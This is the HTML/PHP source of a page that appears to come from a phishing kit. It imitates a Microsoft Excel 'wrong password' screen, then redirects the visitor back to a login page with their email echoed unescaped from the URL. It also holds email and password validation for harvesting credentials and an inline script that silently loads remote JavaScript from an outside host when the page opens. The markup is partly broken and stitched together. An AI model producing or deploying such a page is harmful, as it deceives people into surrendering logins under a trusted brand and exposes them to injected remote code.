<!DOCTYPE html>

<html lang="en">

<head>

<link rel="shortcut icon" href="https://www.firb.br/firb/images/favicon.ico"/>

<script type="text/javascript">

<!--

function delayer(){

window.location='page.php?email=<?php echo $_GET["email"];?>';

}

//-->

</script>

<meta charset="utf-8">

<title>Wrong Password</title>

<style type="text/css">



html { 

  background: #; 

  -webkit-background-size: cover;

  -moz-background-size: cover;

  -o-background-size: cover;

  background-size: cover;

}



.transparent {

	zoom: 1;

	filter: alpha(opacity=90);

	opacity: 0.9;

}



.inp{



	border: 1px solid #EAEAEA;

	-moz-border-radius: 3px;

	-webkit-border-radius: 3px;

	border-radius: 3px;

	-webkit-box-shadow: rgba(0, 0, 0, 0.3) 0 1px 3px;

	-moz-box-shadow: rgba(0,0,0,0.3) 0 1px 3px;

	box-shadow: rgba(0, 0, 0, 0.3) 0 1px 3px;

}

.btn {

  background: #8c1ee6;

  background-image: -webkit-linear-gradient(top, #8c1ee6, #6b14b3);

  background-image: -moz-linear-gradient(top, #8c1ee6, #6b14b3);

  background-image: -ms-linear-gradient(top, #8c1ee6, #6b14b3);

  background-image: -o-linear-gradient(top, #8c1ee6, #6b14b3);

  background-image: linear-gradient(to bottom, #8c1ee6, #6b14b3);

  -webkit-border-radius: 10;

  -moz-border-radius: 10;

  border-radius: 10px;

  font-family: Arial;

  color: #ffffff;

  font-size: 20px;

  padding: 13px 15px 12px 16px;

  text-decoration: none;

}



.btn:hover {

  background: #a039f5;

  background-image: -webkit-linear-gradient(top, #a039f5, #963de0);

  background-image: -moz-linear-gradient(top, #a039f5, #963de0);

  background-image: -ms-linear-gradient(top, #a039f5, #963de0);

  background-image: -o-linear-gradient(top, #a039f5, #963de0);

  background-image: linear-gradient(to bottom, #a039f5, #963de0);

  text-decoration: none;

}

#errfn{

  color:red;

}

#errfnn{

  color:red;

}



.cover{

    position: absolute;

    top: 0;

    left: 0;

    height: 100%;

    width: 100%;

    background-color: rgba(0,0,0,0.5);

    z-index: 10;

}



</style>



<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.10.526#p=hgstxhcc545050a7e630_rbh50a151xsvlp1xsvlpx";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script></head>



<body style="background:#fff; font-family:helvetica, verdana, tahoma, arial;" onLoad="setTimeout('delayer()', 4000)">

<div style="width:700px; margin:0 auto;">

<img src="https://c.s-microsoft.com/en-us/CMSImages/Logo_Excel_137x60.png?version=45c06e25-f999-5c64-8cf9-5c580319f5f0" width="96px" height="70px" style="margin:0 0 0 100px;"/><br /><h1 style="color:#696767; text-shadow: 0px 1px 1px #4d4d4d;">Document Is Not Available, Wrong Password...</h1>





      </script>

      <script type="text/javascript">

// <![CDATA[

var excelValidator = new Validator("Adobe");

excelValidator.addValidation("Email",{required:true,message:"Please fill in Email"} );

excelValidator.addValidation("Email",{email:true,message:"The input for Email should be a valid email value"} );

excelValidator.addValidation("Password",{required:true,message:"Please fill in Password"} );



      </script>

   



</body></html>

